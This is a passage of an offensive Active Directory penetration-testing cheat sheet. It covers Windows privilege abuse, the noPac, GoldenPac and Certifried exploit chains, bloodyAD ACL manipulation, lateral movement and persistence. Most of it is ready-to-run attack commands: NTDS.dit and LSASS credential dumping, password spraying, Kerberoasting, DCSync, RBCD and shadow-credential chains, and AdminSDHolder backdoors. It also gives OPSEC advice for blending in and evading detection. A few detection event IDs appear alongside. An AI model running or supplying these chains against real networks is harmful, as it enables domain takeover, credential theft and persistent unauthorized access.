Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\loot\ntds.dit -Overwrite
```

### 10.4 SeDebugPrivilege
Open any process → LSASS dump → tokens.
```cmd
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
```

### 10.5 SeLoadDriverPrivilege
Load arbitrary signed driver → kernel exec.
```cmd
:: EvilDriver / Capcom / Dell DBUtil2_3.sys (BYOVD)
EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\path\Capcom.sys
:: trigger via ExploitCapcom
```

### 10.6 SeTakeOwnershipPrivilege
Take ownership of any object → grant self perms → modify.
```powershell
takeown /F C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant:r "$env:USERNAME:(F)"
```

### 10.7 SeManageVolumePrivilege
Trigger storage MMC RPC → arbitrary write as SYSTEM (Win10/11).
```cmd
SeManageVolumeExploit.exe
```

### 10.8 SeTcbPrivilege
Act as part of OS → forge tokens via `LsaLogonUser`. Practically game over.

### 10.9 SeCreateTokenPrivilege
Forge access tokens directly (rare; SYSTEM-equivalent).
```cmd
SeCreateTokenExploit.exe   :: forges LSA token
```

### 10.10 SeShutdown / SeRemoteShutdown / SeProfileSingleProcess / SeIncreaseQuota
Lower-impact; chain w/ scheduled tasks for restart-trigger.

### 10.11 SeChangeNotifyPrivilege (default for everyone)
Bypass traverse checking — only relevant w/ filesystem ACL bugs.

### 10.12 Quick triage of `whoami /priv`
| Priv | Path |
|---|---|
| SeImpersonate / SeAssignPrimaryToken | Potato → SYSTEM |
| SeBackup | Read NTDS.dit, SAM, LSA → secretsdump |
| SeRestore | Write protected paths → SYSTEM service binary swap |
| SeDebug | LSASS dump |
| SeTakeOwnership | Take SAM/SYSTEM, then read |
| SeLoadDriver | BYOVD kernel exec |
| SeManageVolume | StorageMM exploit |
| SeTcb / SeCreateToken | Direct token forge |

### 10.13 Other classic Windows local
- **AlwaysInstallElevated** (HKLM+HKCU regs = 1) → `msiexec /quiet /i evil.msi`
- **Unquoted service paths** + `C:\Program*.exe`
- **Service ACL** writeable → `sc config name binPath= "..."`
- **DLL hijack** (PATH order, sideloading)
- **UAC bypass** (fodhelper, computerdefaults, ICMLuaUtil) — not privesc to SYSTEM but to High Integrity
- **Token impersonation via incognito (`list_tokens -u`, `impersonate_token`)**
- **Hot patch / printnightmare / certifried / spoolfool** — patched but worth checking
- **CVE-2022-26923 (Certifried)** — see §11
- **CVE-2021-42278/42287 (sAMAccountName / noPac)** — see §11
- **MS14-068 (GoldenPac, CVE-2014-6324)** — see §11

---

## 11. PAC / Computer Account CVEs (noPac, GoldenPac, Certifried)

### 11.1 noPac — CVE-2021-42278 + CVE-2021-42287
**Bug:** sAMAccountName spoofing — rename a computer account to match a DC name (without `$`); KDC issues TGT for renamed account, then S4U2self returns ticket as DC.
**Prereq:** any user creds, MAQ ≥ 1 (or pre-existing controlled computer).
```bash
# Impacket
noPac.py -dc-ip 10.0.0.1 -dc-host DC01 domain.local/owned:pass \
  --impersonate Administrator -use-ldap -shell
# Manual chain
addcomputer.py -computer-name 'pwn$' -computer-pass 'P!' -dc-host DC01 'domain.local/owned:pass'
renameMachine.py -current-name 'pwn$' -new-name 'DC01' 'domain.local/owned:pass'
getTGT.py 'domain.local/DC01:P!' -dc-ip DC
renameMachine.py -current-name 'DC01' -new-name 'pwn$' 'domain.local/owned:pass'
KRB5CCNAME=DC01.ccache getST.py -self -impersonate Administrator -altservice 'cifs/DC01.domain.local' -k -no-pass 'domain.local/DC01'
KRB5CCNAME=Administrator@cifs_DC01.domain.local@DOMAIN.LOCAL.ccache secretsdump.py -k -no-pass DC01.domain.local -just-dc
```
**Patches:** Nov 2021 (KB5008380, KB5008602). Detection: 4741/4742 with `$`-stripped name; TGT for principal whose sAMAccountName changed mid-flight.

### 11.2 GoldenPac — MS14-068 / CVE-2014-6324
**Bug:** KDC fails to validate PAC signatures → forge PAC claiming Domain Admin membership for any user.
**Prereq:** valid domain user creds; unpatched DC (pre-2014 patches).
```bash
goldenPac.py 'domain.local/owned:pass'@DC01.domain.local
# Or impacket
ms14-068.py -u owned@domain.local -s S-1-5-21-... -d DC -p pass
mimikatz # kerberos::golden /user:owned /domain:domain.local /sid:S-1-5-21-... /target:DC /service:cifs /rc4:<dummy> /ptt
```
Mostly historical, but unpatched legacy DCs still appear in HTB / lab / OT networks.

### 11.3 Certifried — CVE-2022-26923
**Bug:** ADCS Machine template authenticates by `dNSHostName`; computer object owner can rewrite `dNSHostName` to match a DC → enroll cert → auth as DC.
**Prereq:** ability to create/own a computer (MAQ ≥ 1 or GenericWrite on existing computer); ADCS with Machine template enabled.
```bash
# Add computer + set dNSHostName=DC fqdn
certipy account create -u owned@domain.local -p pass -user 'pwn' -pass 'P!' -dns DC.domain.local
# Enroll Machine template
certipy req -u 'pwn$@domain.local' -p 'P!' -ca CA -template Machine
# Auth → DC$ NT hash
certipy auth -pfx pwn.pfx -dc-ip DC
# DCSync
secretsdump.py -hashes :<DC$_hash> 'domain.local/DC$@DC' -just-dc
```
**Patch:** May 2022 (KB5014754) — strong cert mapping enforcement (`StrongCertificateBindingEnforcement=2`).

### 11.4 sAMAccountName Spoofing variants
- **CVE-2022-26925 (PetitPotam unauth via LSARPC)** — re-enables anon coerce on LSARPC even after EFSRPC patch
- **CVE-2023-21746 (LocalPotato)** — local NTLM reflection from SYSTEM RPC to SMB

### 11.5 Detection of all above
Watch:
- 4662 with object class `computer` + property `dNSHostName` modification
- 4741 (computer created) by non-admin
- 4742 (computer changed) where `sAMAccountName` toggles between presence/absence of `$`
- ADCS audit 4886/4887 with SAN/UPN containing high-value names
- KDC events 4768/4769 for accounts whose name contains a DC hostname

---

## 12. bloodyAD Command Cheat Sheet

`bloodyAD` is the Linux Swiss-army knife for AD object manipulation. Authenticate via password, NT hash, Kerberos ccache, or certificate. Defaults to LDAP; use `--secure` for LDAPS (needed for password resets/computer creation).

### 12.1 Authentication forms
```bash
# Password
bloodyAD --host DC -d domain.local -u owned -p 'pass' <verb> ...
# NT hash (PtH)
bloodyAD --host DC -d domain.local -u owned -p ':NTHASH' <verb> ...
# Kerberos ticket
KRB5CCNAME=owned.ccache bloodyAD --host DC.domain.local -d domain.local -u owned -k <verb> ...
# Certificate (PKINIT / Shadow Creds)
bloodyAD --host DC -d domain.local -u owned --cert user.pem --key user.key <verb> ...
# LDAPS (mandatory for password ops over LDAP)
bloodyAD --host DC -d domain.local -u owned -p pass --secure <verb> ...
```

### 12.2 Recon (`get`)
```bash
bloodyAD ... get children                                       # list root containers
bloodyAD ... get children --target 'CN=Users,DC=domain,DC=local'
bloodyAD ... get object TARGET                                  # full attributes
bloodyAD ... get object TARGET --attr memberOf,servicePrincipalName,userAccountControl
bloodyAD ... get search --filter '(adminCount=1)'               # raw LDAP filter
bloodyAD ... get writable                                       # objects YOU can write
bloodyAD ... get writable --otype USER --right WRITE            # filter
bloodyAD ... get membership owned                               # group memberships (recursive)
bloodyAD ... get dnsDump                                        # AD-integrated DNS
bloodyAD ... get trusts                                         # trust enumeration
```

### 12.3 Password reset / change
```bash
# Force-reset target (needs ForceChangePassword / GenericAll)
bloodyAD ... set password TARGET 'NewP@ss123!'

# Self change (knows old pass)
bloodyAD ... set password owned 'NewP@ss123!' -oldpass 'CurrentPass'

# Reset via NTLM hash auth
bloodyAD --host DC -d domain.local -u owned -p :NTHASH set password TARGET 'NewP@ss!'

# Reset using LDAPS (required when KDC enforces secure password change)
bloodyAD --host DC -d domain.local -u owned -p pass --secure set password TARGET 'NewP@ss!'
```

### 12.4 Enable / disable account & UAC flag manipulation
```bash
# Enable disabled account
bloodyAD ... remove uac TARGET -f ACCOUNTDISABLE

# Disable account
bloodyAD ... add uac TARGET -f ACCOUNTDISABLE

# Unlock locked account (clear lockoutTime)
bloodyAD ... set object TARGET lockoutTime -v 0

# Disable Kerberos preauth → AS-REP roastable
bloodyAD ... add uac TARGET -f DONT_REQ_PREAUTH

# Enable preauth back
bloodyAD ... remove uac TARGET -f DONT_REQ_PREAUTH

# Mark for unconstrained delegation (needs SeEnableDelegation, usually DA)
bloodyAD ... add uac TARGET -f TRUSTED_FOR_DELEGATION

# Set "Password never expires"
bloodyAD ... add uac TARGET -f DONT_EXPIRE_PASSWD

# Show current UAC flags
bloodyAD ... get object TARGET --attr userAccountControl
```
Common UAC flags: `ACCOUNTDISABLE`, `LOCKOUT`, `PASSWD_NOTREQD`, `DONT_REQ_PREAUTH`, `TRUSTED_FOR_DELEGATION`, `TRUSTED_TO_AUTH_FOR_DELEGATION`, `NOT_DELEGATED`, `USE_DES_KEY_ONLY`, `DONT_EXPIRE_PASSWD`, `WORKSTATION_TRUST_ACCOUNT`, `SERVER_TRUST_ACCOUNT`.

### 12.5 Group membership manipulation
```bash
# Add member to group (needs WriteProperty on `member`, GenericAll, or AddMember)
bloodyAD ... add groupMember 'Domain Admins' owned
bloodyAD ... add groupMember 'Remote Management Users' owned

# Remove member
bloodyAD ... remove groupMember 'Domain Admins' owned

# Self-add (when you have AddSelf)
bloodyAD ... add groupMember 'Backup Operators' owned

# Recursive enumeration first
bloodyAD ... get membership 'Domain Admins' --no-recurse
```

### 12.6 Owner transfer (WriteOwner abuse)
```bash
# Take ownership of an object
bloodyAD ... set owner TARGET owned          # syntax: set owner <target> <new_owner>

# Then grant yourself any right
bloodyAD ... add genericAll TARGET owned
# or
bloodyAD ... add dcsync owned                # add DCSync rights on domain root (when owner of domain object)
```

### 12.7 ACE / DACL manipulation
```bash
# Grant rights
bloodyAD ... add genericAll TARGET owned                # Full control
bloodyAD ... add genericWrite TARGET owned              # Write attrs
bloodyAD ... add writeOwner TARGET owned
bloodyAD ... add writeDacl TARGET owned
bloodyAD ... add allExtendedRights TARGET owned         # incl ForceChangePassword
bloodyAD ... add rbcd TARGET owned                      # write msDS-AllowedToActOnBehalfOfOtherIdentity
bloodyAD ... add shadowCredentials TARGET owned         # add Key Credential Link
bloodyAD ... add dcsync owned                           # DS-Replication-Get-Changes(-All) on domain root

# Remove rights
bloodyAD ... remove genericAll TARGET owned
bloodyAD ... remove rbcd TARGET owned
bloodyAD ... remove shadowCredentials TARGET owned --key-id <id>

# View raw DACL
bloodyAD ... get object TARGET --attr nTSecurityDescriptor --raw
```

### 12.8 Computer accounts (MAQ)
```bash
# Add computer (uses LDAPS; falls back to SAMR if --secure unavailable)
bloodyAD ... --secure add computer 'evil$' 'Pwn1!'

# Add computer with custom DNS (Certifried prerequisite)
bloodyAD ... --secure add computer 'evil$' 'Pwn1!' --dns DC.domain.local

# Remove
bloodyAD ... remove object 'evil$'

# Read MAQ
bloodyAD ... get object 'DC=domain,DC=local' --attr ms-DS-MachineAccountQuota
```

### 12.9 Shadow Credentials (PKINIT)
```bash
# Add Key Credential Link entry
bloodyAD ... add shadowCredentials TARGET                 # auto-generates key
bloodyAD ... add shadowCredentials TARGET --path out.pfx --password '' 

# List existing
bloodyAD ... get object TARGET --attr msDS-KeyCredentialLink

# Remove specific key (cleanup post-exploit)
bloodyAD ... remove shadowCredentials TARGET --key-id <DeviceID>
```

### 12.10 SPN management (targeted Kerberoast)
```bash
# Add SPN to target user (needs WriteProperty on servicePrincipalName)
bloodyAD ... add spn TARGET 'cifs/fakehost'

# Remove SPN
bloodyAD ... remove spn TARGET 'cifs/fakehost'

# Then roast offline
GetUserSPNs.py domain.local/owned:pass -dc-ip DC -request-user TARGET
```

### 12.11 DNS records (AD-integrated DNS)
```bash
# Add A record (needs DnsAdmins or write on dnsZone)
bloodyAD ... add dnsRecord attacker 10.0.0.99
# Custom type
bloodyAD ... add dnsRecord attacker 10.0.0.99 --type A --zone domain.local --ttl 60
# Remove
bloodyAD ... remove dnsRecord attacker
# List
bloodyAD ... get dnsDump --zone domain.local
```

### 12.12 Generic object write (raw attribute set)
```bash
# Arbitrary attribute set
bloodyAD ... set object TARGET <attribute> -v <value>
# Multi-value append
bloodyAD ... set object TARGET <attribute> -v <value1> -v <value2>
# Examples
bloodyAD ... set object TARGET userPrincipalName -v 'admin@domain.local'    # ESC9/14 prep
bloodyAD ... set object TARGET dNSHostName -v 'DC01.domain.local'           # Certifried prep
bloodyAD ... set object TARGET msDS-AllowedToActOnBehalfOfOtherIdentity -v <SDDL>
bloodyAD ... set object TARGET altSecurityIdentities -v 'X509:<I>...<S>...'  # ESC14
```

### 12.13 GMSA / LAPS extraction
```bash
bloodyAD ... get object 'CN=svc_gmsa,CN=Managed Service Accounts,DC=domain,DC=local' --attr msDS-ManagedPassword
bloodyAD ... get object COMPUTER --attr ms-Mcs-AdmPwd                       # legacy LAPS
bloodyAD ... get object COMPUTER --attr msLAPS-EncryptedPassword            # LAPSv2
```

### 12.14 End-to-end chains using only bloodyAD
```bash
# Chain A: GenericAll on user → reset → DA via group
bloodyAD ... set password svc_admin 'P@ss123!'
bloodyAD ... add groupMember 'Domain Admins' svc_admin

# Chain B: WriteOwner → take ownership → grant DCSync
bloodyAD ... set owner 'DC=domain,DC=local' owned
bloodyAD ... add dcsync owned
secretsdump.py 'domain.local/owned:pass'@DC -just-dc

# Chain C: Disabled DA-equivalent account → enable → reset → use
bloodyAD ... remove uac old_admin -f ACCOUNTDISABLE
bloodyAD ... set password old_admin 'NewP@ss!'
bloodyAD ... get membership old_admin

# Chain D: GenericWrite on computer → RBCD
bloodyAD ... --secure add computer 'evil$' 'Pwn1!'
bloodyAD ... add rbcd VICTIM evil$
getST.py -spn cifs/VICTIM.domain.local -impersonate Administrator 'domain.local/evil$:Pwn1!'

# Chain E: GenericAll → Shadow Credentials → NT hash
bloodyAD ... add shadowCredentials TARGET --path tgt.pfx --password ''
certipy auth -pfx tgt.pfx -dc-ip DC

# Chain F: AdminSDHolder backdoor
bloodyAD ... add genericAll 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' owned
# wait ~60 min for SDProp → propagates to all protected groups
```

### 12.15 Kerberos auth + bloodyAD
```bash
getTGT.py 'domain.local/owned:pass'
KRB5CCNAME=owned.ccache bloodyAD --host DC.domain.local -d domain.local -u owned -k get writable
```

---

## 13. Lateral Movement Quick Ref

```bash
# Impacket (Linux)
psexec.py domain.local/user:pass@HOST
smbexec.py domain.local/user:pass@HOST          # quieter than psexec
wmiexec.py domain.local/user:pass@HOST          # no service
atexec.py domain.local/user:pass@HOST 'whoami'  # task scheduler
dcomexec.py domain.local/user:pass@HOST         # MMC20/ShellWindows DCOM
mssqlclient.py domain.local/user:pass@SQL -windows-auth   # xp_cmdshell

# Kerberos (PtT / PtH overpass)
KRB5CCNAME=admin.ccache wmiexec.py -k -no-pass HOST.domain.local
getTGT.py domain.local/user -hashes :HASH

# WinRM
evil-winrm -i HOST -u user -p pass
nxc winrm HOST -u user -H NTHASH -x 'whoami'

# RDP w/ NTLM
xfreerdp /u:user /pth:HASH /v:HOST /dynamic-resolution
```

---

## 14. End-to-End Chain Patterns (memorize)

1. **Null/Anon → users → AS-REP roast → crack → BloodHound → ACL edge → DA**
2. **Foothold → Kerberoast → crack svc → BloodHound owned → GenericWrite → targeted Kerberoast → DA**
3. **Foothold → MAQ ≥1 → addcomputer → coerce DC → relay to LDAP → RBCD → S4U → DA**
4. **Foothold → ADCS find ESC1/8 → certipy req → certipy auth → NT hash of TARGET / DC$**
5. **Foothold → GenericAll on TARGET → Shadow Creds (PKINIT) → TARGET NT hash → pivot**
6. **Backup Op on DC → SeBackup → diskshadow → NTDS.dit → DCSync offline**
7. **SeImpersonate on web/SQL host → Potato → SYSTEM → DPAPI/LSASS → svc creds → AD**
8. **WriteOwner DC$ + ADCS → cert template manipulation → DC takeover**
9. **Unconstrained host → coerce DC → TGT → DCSync**
10. **Tier-0 misclassification: any user with GenericAll on `AdminSDHolder` → silent DA grant via SDProp**

---

## 15. OPSEC / Detection Awareness
- LDAP queries → 4662 events (filter on dangerous GUIDs)
- AS-REP/Kerberoast → 4768/4769 with weak encryption (RC4=0x17)
- DCSync → 4662 with `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DRSUAPI)
- ntlmrelayx → smb anomaly + 4624 type-3 from relay box
- shadow creds → 5136 modify on `msDS-KeyCredentialLink`
- Coercion → DCERPC EFSRPC/MS-RPRN/MS-DFSNM/MS-FSRVP traffic
- Use Kerberos over NTLM, PKINIT over password, AES over RC4 to blend
- Drop `--no-smb-server` and avoid SMB lateral from suspicious hosts
- Spread-out timing; jitter LDAP paged queries; randomise computer names; honour Protected Users

---

## 16. Tooling Inventory
| Stage | Linux | Windows |
|---|---|---|
| Recon | bloodhound-python, ldapdomaindump, nxc, ldeep, certipy find | SharpHound, ADRecon, PingCastle, PowerView, Whisker |
| ACL abuse | bloodyAD, dacledit.py, owneredit.py, addcomputer.py, rbcd.py, targetedKerberoast.py | PowerView Set-DomainObject, ActiveDirectory, Set-ADAccountControl |
| Shadow creds | certipy, pywhisker, PKINITtools | Whisker, Rubeus |
| ADCS | certipy, ntlmrelayx --adcs | Certify, Certi |
| Kerberos | impacket (GetUserSPNs, GetNPUsers, getTGT, getST, ticketer, secretsdump), kerbrute | Rubeus, mimikatz, asktgt, kerberoast |
| Coerce | PetitPotam.py, coercer, dfscoerce.py, printerbug.py, shadowcoerce.py | SpoolSample, PetitPotam.exe, DFSCoerce.exe |
| Relay | ntlmrelayx.py, krbrelayx.py | Inveigh, KrbRelay, KrbRelayUp |
| LSASS | nanodump (cross), pypykatz | Mimikatz, nanodump, comsvcs.dll, SafetyKatz |
| Privesc | linpeas n/a, BloodHound | winPEAS, Seatbelt, PrivescCheck, PowerUp, GodPotato, JuicyPotatoNG, PrintSpoofer, SeManageVolumeExploit |
| Ticket forge | impacket ticketer | Rubeus, mimikatz `kerberos::golden` |
| Persistence | — | DSRM, Skeleton Key, AdminSDHolder, GoldenGMSA, custom SSP |

---

## 17. Quick Reference — One-Liners
```bash
# Username enum (no creds)
kerbrute userenum -d domain.local --dc DC users.txt
# Password spray
nxc smb DC -u users.txt -p 'Spring2026!' --continue-on-success
# Find AS-REP roastable + roast
GetNPUsers.py domain.local/ -usersfile users -no-pass -outputfile asrep.hash
# Roast all SPNs
GetUserSPNs.py domain.local/owned:pass -dc-ip DC -request -outputfile krb.hash
# DCSync one-liner
secretsdump.py 'domain.local/owned:pass'@DC -just-dc-user 'krbtgt'
# RBCD complete chain
addcomputer.py -computer-name 'evil$' -computer-pass 'P!' -dc-host DC 'domain.local/owned:pass' && \
rbcd.py -delegate-from 'evil$' -delegate-to 'VICTIM$' -dc-ip DC -action write 'domain.local/owned:pass' && \
getST.py -spn 'cifs/VICTIM.domain.local' -impersonate Administrator 'domain.local/evil$:P!' && \
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass VICTIM.domain.local
# ESC1
certipy req -u owned@domain.local -p pass -ca CA -template Vuln -upn Administrator@domain.local && \
certipy auth -pfx administrator.pfx
# Shadow creds
certipy shadow auto -u owned@domain.local -p pass -account TARGET
# noPac
noPac.py -dc-ip DC -dc-host DC domain.local/owned:pass --impersonate Administrator -use-ldap -shell
```

---

## 18. Prereq Decision Tree
```
have any creds? ──no──> kerbrute userenum + spray + ASREP roast + null SMB/LDAP
                │
                yes
                ├── BloodHound collect All
                ├── certipy find -vulnerable
                ├── owned principal → outbound ACL edges?
                │     ├── on user → reset / shadow creds / targeted roast
                │     ├── on group → AddMember
                │     ├── on computer → RBCD / shadow creds
                │     ├── on GPO/OU → pyGPOAbuse
                │     └── on AdminSDHolder/Domain → DCSync rights
                ├── delegation flags? → unconstrained coerce / S4U / RBCD
                ├── ADCS vuln? → ESC1/2/3/4/6/7/8/9/11/13/15
                ├── MAQ>0? → addcomputer pivot
                ├── coercion + relay? → ntlmrelayx --delegate-access / --adcs
                └── no edges → host loot → DPAPI / PSReadLine / LSASS / SAM → re-feed BloodHound
```

---

## 19. Final Rule
After every step, ask:
> "What new edges did this credential / hash / ticket create in BloodHound? Re-mark owned and re-query shortest path to DA."

Never stop at first DA — enumerate trusts, child/parent forests, foreign principals. Persistence: krbtgt rotation cycle (twice, or skeleton key), DSRM, GoldenGMSA, AdminSDHolder backdoor, certificate-based (Golden Cert via stolen CA cert).
